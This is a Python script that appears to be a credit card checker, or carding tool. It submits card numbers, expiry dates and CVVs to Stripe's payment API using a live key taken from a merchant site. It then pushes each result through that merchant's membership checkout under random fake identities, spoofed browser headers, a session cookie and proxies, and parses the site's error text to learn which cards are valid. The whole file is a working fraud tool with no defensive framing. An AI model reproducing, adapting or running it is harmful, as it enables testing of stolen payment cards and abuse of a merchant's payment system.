import requests,random 
letters = ["a", "b","c", "d","e", "f","g", "h","i", "j","k", "l","m", "n",
           "o", "p","q", "r","s", "t","u", "v","w", "x","y", "z",]
email = ''
for _ in range(10):
    letter = random.sample(letters,1)[0]
    email += letter

email += '@gmail.com'

user = ''
for _ in range(7):
    letter = random.sample(letters,1)[0]
    user += letter



last = ''
for _ in range(7):
    letter = random.sample(letters,1)[0]
    last += letter


first = user 
name = user






def find_between(data, first, last):
  try:
    start = data.index(first) + len(first)
    end = data.index(last, start)
    return data[start:end]
  except ValueError:
    return None




def cc_check(cc,mes,ano,cvv,proxies):

    # print(requests.get("https://check.srfxdz.repl.co/",proxies=proxies).text)
    # exit()
    x = f"{cc}|{mes}|{ano}|{cvv}"
    url = "https://api.stripe.com/v1/payment_methods"
    data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604&time_on_page=97200&key=pk_live_51Iajo1GQh2JM4esedxzACzQrlkdsG9xYaVSkae21BvTT24AiF9BjYEOQ42HR3LSHRoS8xVf7x720EWzSwjFa1ESi00HOBqv7Jp"

    try:
        req1 = requests.post(url,data).json()
        id = req1["id"]

    except:
        try:
            err = req1["error"]["decline_code"]
        except:
            err = req1["error"]["code"]
        else:
            err = req1
        print (f"<code>{x}</code> <b>{err}</b>\n\n")
        return (f"<code>{x}</code> <b>{err}</b>\n\n")
        
    
    head = {
    'authority':'investetf.it',
    'method':'POST',
    'path':'/membership-account/membership-checkout/',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-US,en;q=0.9',
    'cache-control':'max-age=0',
    'content-length':'435',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'cmplz_policy_id=20; cmplz_statistics=allow; _gcl_au=1.1.395107726.1670580408; __stripe_mid=8bd82986-5b69-4568-aeb9-8f60f58c822196d6d7; __stripe_sid=6fa61bc8-cdf9-4f30-bea9-8ca322c3728d68be8d; cmplz_banner-status=dismissed; PHPSESSID=cd739f35ec715fbeecf2fe5687c8ef77; pmpro_visit=1',
    'origin':'https://investetf.it',
    'referer':'https://investetf.it/membership-account/membership-checkout/',
    'sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    }
    url2 = "https://investetf.it/membership-account/membership-checkout/"
    data2 = f"level=1&checkjavascript=1&other_discount_code=&username={name}&password=ricchydC%401&password2=ricchydC%401&bemail={email}&bconfirmemail={email}&fullname=&first_name={first}&last_name={last}&cellulare=5593657262&desideri_fattura=no&piva=&azienda=&CardType=mastercard&discount_code=&tos=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber=XXXXXXXXXXXX2993&ExpirationMonth=11&ExpirationYear=2027"
    try:
        req2 = requests.post(url=url2,data=data2,headers=head,proxies=proxies)
    except Exception as e:
        print (f"<code>{x}</code> {e}\n\n")
        return (f"<code>{x}</code> {e}\n\n")

    stripe = find_between(req2.text, 'class="pmpro_message pmpro_error">', '</')
    try:   
        resp = stripe.split(".")[1]
        print(f"<code>{x}</code> <b>{resp}</b>\n\n")
        return (f"<code>{x}</code> <b>{resp}</b>\n\n")
    except:
        print(f"<code>{x}</code> <b>{resp}</b>\n\n")
        return (f"<code>{x}</code> <b>{resp}</b>\n\n")



        
